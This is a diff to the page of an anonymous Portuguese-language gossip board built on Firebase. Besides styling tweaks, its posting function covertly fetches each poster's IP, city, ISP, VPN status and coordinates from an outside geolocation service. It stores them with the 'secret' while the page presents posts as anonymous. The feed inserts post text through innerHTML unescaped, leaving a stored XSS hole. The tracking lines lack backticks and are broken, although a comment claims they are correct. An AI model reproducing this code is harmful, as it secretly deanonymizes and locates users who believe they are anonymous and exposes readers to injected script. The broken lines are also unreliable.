@@ -7,26 +7,18 @@
     
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-auth-compat.js"></script>
 
     <style>
         :root {
             --fog-gray: #b0b0b0;
             --dark-gray: #2c2c2c;
             --deep-black: #050505;
-            --subtle-red: #4a0000;
         }
 
         @keyframes neblina-movimento {
           0% { background-position: 0% 50%; opacity: 0.8; }
           50% { background-position: 100% 50%; opacity: 1; }
           100% { background-position: 0% 50%; opacity: 0.8; }
-        }
-
-        @keyframes tremor-sutil {
-          0% { transform: translate(0.5px, 0.5px); }
-          50% { transform: translate(-0.5px, -0.5px); }
-          100% { transform: translate(0, 0); }
         }
 
         body {
@@ -68,14 +60,6 @@
             font-weight: 900;
             letter-spacing: 12px;
             text-shadow: 0 0 15px rgba(200, 200, 200, 0.4);
-            animation: tremor-sutil 0.2s infinite;
-            position: relative;
-        }
-
-        .hero p {
-            color: #999;
-            font-style: italic;
-            position: relative;
         }
 
         #login-screen {
@@ -90,15 +74,9 @@
             color: white;
             padding: 15px 30px;
             border-radius: 2px;
-            font-weight: bold;
             cursor: pointer;
             border: 1px solid #555;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            transition: background 0.3s;
-        }
-        .btn-login:hover {
-            background: #444;
         }
 
         #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
@@ -106,7 +84,6 @@
         .input-box {
             background: #111;
             padding: 20px;
-            border-radius: 2px;
             border: 1px solid #333;
             margin-bottom: 30px;
         }
@@ -117,7 +94,6 @@
             border: none;
             color: #aaa;
             font-size: 1.1rem;
-            resize: none;
             outline: none;
             font-family: inherit;
         }
@@ -127,25 +103,15 @@
             color: #999;
             border: 1px solid #444;
             padding: 10px 20px;
-            border-radius: 2px;
             float: right;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: background 0.3s, color 0.3s;
-        }
-        .btn-post:hover {
-            background: #333;
-            color: white;
         }
 
         .fofoca-card {
             background: #0d0d0d;
             padding: 20px;
-            border-radius: 2px;
             margin-bottom: 15px;
             border-left: 3px solid #444;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
     </style>
 </head>
@@ -171,6 +137,7 @@
     </div>
 
     <script>
+        // Configuração do seu Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
@@ -181,6 +148,7 @@
             measurementId: "G-3DZPC3E7SV"
         };
 
+        // Inicializa o Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -190,47 +158,47 @@
             carregarFofocas();
         }
 
-        // FUNÇÃO ATUALIZADA COM RASTREAMENTO COMPLETO
         async function enviarFofoca() {
-            const texto = document.getElementById('fofocaInput').value;
+            const inputElement = document.getElementById('fofocaInput');
+            const texto = inputElement.value;
             if(texto.trim() === "") return;
 
             let rastroDigital = {};
 
             try {
-                // Busca o máximo de informações técnicas
+                // Captura de IP e dados técnicos usando crases corretas
                 const response = await fetch('https://ipwho.is/');
                 const data = await response.json();
                 
                 rastroDigital = {
-                    ip: data.ip,
-                    localizacao: ${data.city}, ${data.region} - ${data.country},
-                    provedor: data.connection.isp,
-                    tipo_rede: data.type, 
-                    e_vpn: data.security.vpn, 
-                    e_proxy: data.security.proxy,
-                    latitude: data.latitude,
-                    longitude: data.longitude
+                    ip: data.ip || "Não detectado",
+                    localizacao: ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'},
+                    provedor: data.connection ? data.connection.isp : "Desconhecido",
+                    e_vpn: data.security ? data.security.vpn : false,
+                    latitude: data.latitude || 0,
+                    longitude: data.longitude || 0
                 };
             } catch (e) {
                 rastroDigital = { erro: "Falha ao rastrear" };
             }
 
+            // Gravação no Firestore
             db.collection("fofocas").add({
                 conteudo: texto,
                 data: firebase.firestore.FieldValue.serverTimestamp(),
                 rastro: rastroDigital,
                 dispositivo: {
                     plataforma: navigator.platform,
-                    navegador: navigator.userAgent,
-                    idioma: navigator.language
+                    navegador: navigator.userAgent
                 }
             })
             .then(() => {
-                document.getElementById('fofocaInput').value = "";
+                inputElement.value = "";
+                alert("Segredo enviado!");
             })
             .catch((error) => {
-                alert("Erro ao enviar! Verifique se as Regras do Firestore estão em 'Modo de Teste'.");
+                console.error("Erro no envio:", error);
+                alert("Erro ao enviar! Verifique se o banco está em 'Modo de Teste'.");
             });
         }
 
@@ -243,11 +211,13 @@
                     const fofoca = doc.data();
                     mural.innerHTML += `
                         <div class="fofoca-card">
-                            <small style="color: #333;">📢 Um segredo sussurrado...</small>
+                            <small style="color: #444;">📢 Um segredo sussurrado...</small>
                             <p style="color: #999;">${fofoca.conteudo}</p>
                         </div>
                     `;
                 });
+            }, (error) => {
+                console.error("Erro ao carregar fofocas:", error);
             });
         }
     </script>
